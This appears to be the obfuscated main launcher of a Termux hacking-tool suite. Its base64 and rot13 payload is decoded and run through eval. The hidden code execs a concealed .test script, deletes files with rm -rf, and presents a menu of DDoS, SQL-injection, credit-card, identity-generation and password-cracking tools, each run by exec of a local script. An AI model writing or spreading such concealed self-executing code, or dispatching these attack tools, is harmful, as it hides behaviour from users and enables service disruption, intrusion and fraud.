
#######################
#                     #
#        main         # MAIN FILE
#                     #
#####################################
#  Author: Cracker911181 ############
#####################################
#                            #
#   CODER :  CRACKER911181   #
#                            #
##############################



# Coded by Cracker
# CRACKER911181




import base64, codecs
magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsLGdsb2IKCiNUZXh0IGNvbG91cgojY3JlYXRlZCBCeSBDcmFja2VyOTExMTgxCmNvbG91cm9mZj0iXHgxYlswMG0iICNjb2xvdXIgb2ZmCgpyZWQ9Ilx4MWJbOTFtIiAjcmVkCmdyZWVuPSJceDFiWzkybSIgI2dyZWVuCnllbGxvdz0iXHgxYls5M20iICN5ZWxsb3cKYmx1ZT0iXHgxYls5NG0iICNibHVlCnJvc3k9Ilx4MWJbOTVtIiAjcm9zeQpwZXN0PSJceDFiWzk2bSIgI3Blc3QKCnJlZDE9Ilx4MWJbMTs5MW0iICNyZWQKZ3JlZW4xPSJceDFiWzE7OTJtIiAjZ3JlZW4KeWVsbG93MT0iXHgxYlsxOzkzbSIgI3llbGxvdwpibHVlMT0iXHgxYlsxOzk0bSIgI2JsdWUKcm9zeTE9Ilx4MWJbMTs5NW0iICNyb3N5CnBlc3QxPSJceDFiWzE7OTZtIiAjcGVzdAoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKdHJ5OgkKCWV4ZWMob3BlbigiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL2hvbWUvQ3JhY2tlci1Ub29sLy50ZXN0L21hYWlpbi5weSIsInIiKS5yZWFkKCkpCglvcy5zeXN0ZW0oImNobW9kICt4IC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvYmluL2NyYWNrZXIiKQpleGNlcHQ6CglwYXNzCgppZiBsZW4oZ2xvYi5nbG9iKCIvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvaG9tZS9DcmFja2VyLVRvb2wvLnRlc3QvbWFhaWluLnB5IikpPT0xOgoJb3Muc3lzdGVtKCJybSAtcmYgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL2hvbWUvQ3JhY2tlci1Ub29sLy50ZXN0L21hYWlpbi5weSIpCglzeXMuZXhpdCgpCgoKCgpvcy5zeXN0ZW0oInJtIC1yZiByZXF1aXJlbWVudC5zaCIpCm9zLnN5c3RlbSgicm0gLXJmIF9fcHljYWNoZV9fIikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgpkZWYgY29udCgpOgoJd2hpbGUgVHJ1ZToKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludChyb3N5MSsiIiIKCQoJICAgICAgICAgICAgICAgICAgICAgMXwgRkIKCSAgICAgICAgICAgICAgICAgICAgIDJ8IFRlbGVncmFtCgkgICAgICAgICAgICAgICAgICAgICAzfCBHaXRIdWIKCSAgICAgICAgICAgICAgICAgICAgICIiIityZWQxKyIiIjR8IEJhY2sgVG8gSG9tZQoJIiIiKQoJCQoJCWNob3NlPXN0cihpbnB1dChyb3N5KyJcblxuRW50ZXIgWW91ciBPcHRpb246ICIpKQoJCgkJaWYgY2hvc2U9PSIxIjoKCQkJcHJpbnQoIlxuICBPcGVuaW5nIFVSTDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2NyYWNrZXI5MTExODEiKQoJCQlvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9jcmFja2VyOTExMTgxIikKCQkJdGltZS5zbGVlcCgzKQoJCWVsaWYgY2hvc2U9PSIyIjoKCQkJcHJpbnQoIlxuICBPcGVuaW5nIFVSTDogaHR0cHM6Ly90Lm1lL2NyYWNrZXI5MTExODEiKQoJCQlvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vdC5tZS9jcmFja2VyOTExMTgxIikKCQkJdGltZS5zbGVlcCgzKQoJCQoJCWVsaWYgY2hvc2U9PSIzIjoKCQkJcHJpbnQoIlxuICBPcGVuaW5nIFVSTDogaHR0cHM6Ly9naXRodWIuY29tL2NyYWNrZXI5MTExODEiKQoJCQlvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vZ2l0aHViLmNvbS9jcmFja2VyOTExMTgxIikKCQkJdGltZS5zbGVlcCgzKQoJCQkKCQllbGlmIGNob3NlPT0iNCI6CgkJCWJyZWFrCgoKZGVmIHZvaWNlKCk6Cgl0ZXh0PXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdX'
love = 'VtITI4qQbtVvxcPty3nTyfMFOHpaIyBtbWPJkuow1mqUVbnJ5jqKDbpz9mrFfvKT5SoaEypvOMo3IlVRkuozq1LJqyXTI4LJ1joTH6VPqyov9vovpcBvNvXFxXPDycMvOfLJ49CFVvVT9lVTkuow09VvNvBtbWPDyjpzyhqPulMJDeVykhKT5pqRkuozq1LJqyVR5iqPORMJ5cMJDvXDbWPJIfp2H6PtxWPKMinJAyCJqHISZbqTI4qQ10MKu0YTkuozp9oTShXDbWPDyznJkyCKA0pvucoaO1qPtvKT5SoaEypvOMo3IlVRMcoTHtGzSgMFOTo3Vtp2S2nJ5aXTI4LJ1joTH6VUEyp3DhoKNmXGbtVvxcPtxWPKqbnJkyVSElqJH6PtxWPDyjLKEbCKA0pvucoaO1qPulo3A5XlWpoxIhqTIlVSyiqKVtH2S2nJ5aVSOuqTt6VPVcXDbWPDxWnJLtpTS0nQ09VvVto3VtpTS0nQ09VvNvBtbWPDxWPKOlnJ50XUWyMPfvKT5poyk0HTS0nPOBo3DtETIhnJIxVvxXPDxWPJIfp2H6PtxWPDxWoJ5jqQ1mqUVbpTS0nPfvYlVeMzyfMFxXPDxWPDy2o2ywMF5mLKMyXT1hpUDcPtbXPtcxMJLtqzZbXGbXPKqbnJkyVSElqJH6PtxWpUWcoaDbLzk1MFgzVvVvPvNtVS9sK18tVPNtVPNtVPNtVPNtVPNtKlNtVPNtVPNtVPNtVPNtVPOsK19sKlNtVPNtVPNtVPNtKjbtVP8tK19ssS8tK18tK18tKlNtK19ssPO8VS9sK19sVS8tK18tVPO8KlNtVS98K18tVPOsK18tsPO8PvNvVvVeLzk1MFfvVvW8VUjtVPO8VPWsKl8tK2NtsP8tK198VUjiVP8tKlOpVPWsK3ksK19ssPO8YlOsVSjtYlOsVSk8VUjXVPVvVvgjMKA0XlVvVajtsS9sK3jtsPO8VPussPO8VPusK3jtVPN8VPOsKl8tsPO8K19sK198VUjtXS8cVUjtXS8cVUjtsNbtVSksK19ssS98VPOpK18fK3kpK19ssS98KS9pK19ssS98VPNtVPNtVUkssSksK18iVSksK18isS98KT5povNvVvVeM3WyMJ4eVvVvVPNtVPNtVPNtVPNtVRAlLJAeVSyiqKVtI29loTDfVRyzVSyiqFOQLJ5poykhKUDtVPNtVPNtVPNtVPVvVvgvoUIyXlVvVyivzVIqVRyDVSEio2jtJ+XLuI0tKT4vVvVeM3WyMJ4eVvVvVQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CFVvVvgwo2kiqKWiMzLcPtxWL2uip2H9p3ElXTyhpUI0XUOyp3DeVykhKT5pqSk0ZF4tD29hqzIlqPOHMKu0VSEiVSMinJAyKT5pqSk0VvglMJDeVwNjYxWuL2ftIT8tFT9gMIkhKT4vX3Wip3xeVxIhqTIlVSyiqKVtG3O0nJ9hBvNvXFxXPDbWPJyzVTAbo3AyCG0vZFV6PtxWPKMinJAyXPxXPDyyoTyzVTAbo3AyCG0vZQNvBtbWPDyvpzIunjbWPDbXPtbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVjbXqzIlp2yiow1ipTIhXPVhqTImqP92MKWmnJ9hYaE4qPVfVaVvXF5lMJSxXPxXPvA2MKWmnJ9hVQ0tVwLhAFVXPaqbnJkyVSElqJH6Ptyipl5mrKA0MJ0bVzAfMJSlVvxXPKOlnJ50XTWfqJHkX2LvVvVXVPNtK19sKlNtVPNtVPNtVPNtVPNtVPOsVPNtVPNtVPNtVPNtVPNtVS9sK19sVPNtVPNtVPNtVPOsPvNtYlOsK198KlOsKlOsKlOsVPOsK198VUjtK19sK18tKlOsKlNtVUksVPNtK3ksKlNtVS9sKlO8VUjXVPVvVvgvoUIyZFfvVvW8VUjtVPO8VPWsKl8tK2NtsP8tK198VUjiVP8tKlOpVPWsK3ksK19ssPO8YlOsVSjtYlOsVSk8VUjXVPVvVvgjMKA0ZFfvVvW8VUksK198VUjtsPNbK3jtsPNbK198VPNtCPNtK18iVUjtsS9sK19ssPO8VPusXFO8VPusXFO8VUjXVPOpK19sK3kssPNtKS9sYS98KS9sK3kssSksKS9sK3kssPNtVPNtVPO8K3kpK19sYlOpK19sY3kssSkhKT4tVvVvX2qlMJIhZFfvVvVtVPNt'
god = 'ICAgICAgICAgQ3JhY2sgWW91ciBXb3JsZCwgSWYgWW91IENhblxuXG5cdFx0ICAgICAgIiIiK3llbGxvdzErIiIiVmVyc2lvbjoiIiIrcmVkMSt2ZXJzaW9uKyIiIiIiIitjb2xvdXJvZmYpCgkKCQoJY2hvb3NlPXN0cihpbnB1dChwZXN0MSsiIiJcbgpcdHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKXHR8IiIiK3llbGxvdzErIiIiIDEuQ29udGFjdCBJbmZvIiIiK3Blc3QxKyIiIiAgICAgIDIuSVAgVG9vbCAgICAgICAgfApcdHwgMy5TdWJkb21haW4gU2Nhbm5lciA0LkRkb3MgQXR0YWNrICAgIHwKXHR8IDUuQWRtaW4gRmluZGVyICAgICAgNi5IYXMgQ3JhY2tlciAgICB8Clx0fCA3LlZpZGVvIERvd25sb2FkZXIgIDguQW5vbiBTaGFyZSAgICAgfApcdHwgOS5TUUwtSW5qZWN0aW9uICAgIDEwLlRleHQgVG8gVm9pY2UgIHwKXHR8MTEuUHl0aG9uIE9iZnVzY2F0ZSAxMi5UZWxlZ3JhbSBLaXQgICB8Clx0fDEzLlRlcm11eCBGcmFtZXdvcmsgMTQuS2FsaSBOZXRodW50ZXIgfApcdHwxNS5UZXJtdXggVG9vbCAgICAgIDE2LlVSTCBDaGFuZ2VyICAgIHwKXHR8MTcuVVJMIFNob3J0bmVyICAgICAxOC5XRUIgVG9vbCAgICAgICB8Clx0fDE5LlRlbXAgTWFpbCAgICAgICAgMjAuR2VuYXJhdGUgR01BSUwgfApcdHwyMS5DQyBUb29sICAgICAgICAgIDIyLkdlbmVyYXRlIElkZW50LnwKXHR8MjMuTXVsdGkgRGRvcyAgICAgICAyNC5FbWFpbCBUb29sICAgICB8Clx0fDI1LlppcCBQYXNzIENyYWNrICAgICAgICAgICAgICAgICAgICAgfApcdHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKXHR8IiIiK2dyZWVuMSsiIiIgODguVXBkYXRlIENyYWNrZXItVG9vbCIiIityZWQxKyIiIiAgICA5OS5FeGl0IiIiK3Blc3QxKyIiIiAgICB8Clx0fD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fApcbiIiIityb3N5MSsiIiJFbnRlciBZb3VyIE9wdGlvbjogIiIiKSkKCgkKCWlmIGNob29zZT09Ijk5IjoKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludCh5ZWxsb3crIlxuXG5cblxuXG5cblx0XHTwn6SpVGhhbmtzIEZvciBVc2luZyBNeSBUb29s8J+kqSAgIFxuXG5cbiIpCgkJc3lzLmV4aXQoKQoJCgkKCWVsaWYgY2hvb3NlPT0iMSI6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJY29udCgpCgkKCWVsaWYgY2hvb3NlPT0iMiI6CgkJb289b3BlbigiaXAucHkiLCJyIikKCQlleGVjKG9vLnJlYWQoKSkKCQoJZWxpZiBjaG9vc2U9PSI0IjoKCQlvbz1vcGVuKCJkZG9zLnB5IiwiciIpCgkJZXhlYyhvby5yZWFkKCkpCgkKCWVsaWYgY2hvb3NlPT0iMyI6CgkJb289b3Blbigic3ViZG0ucHkiLCJyIikKCQlleGVjKG9vLnJlYWQoKSkKCQoJZWxpZiBjaG9vc2U9PSI1IjoKCQlvbz1vcGVuKCJhZG1pbi5weSIsInIiKQoJCWV4ZWMob28ucmVhZCgpKQoJCgllbGlmIGNob29zZT09IjYiOgoJCW9vPW9wZW4oImhhcy5weSIsInIiKQoJCWV4ZWMob28ucmVhZCgpKQoJCgllbGlmIGNob29zZT09IjciOgoJCW9vPW9wZW4oImRvd25sZC5weSIsInIiKQoJCWV4ZWMob28ucmVhZCgpKQoJCgllbGlmIGNob29zZT09IjgiOgoJCW9vPW9wZW4oIi9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy9ob21lL0NyYWNrZXItVG9vbC8udGVzdC9hbm9uX3NoYXJlLnB5IiwiciIpCgkJZXhlYyhvby5yZWFkKCkpCgkKCWVsaWYgY2hvb3NlPT0iOSI6CgkJb289b3Blbigic3FsLW'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
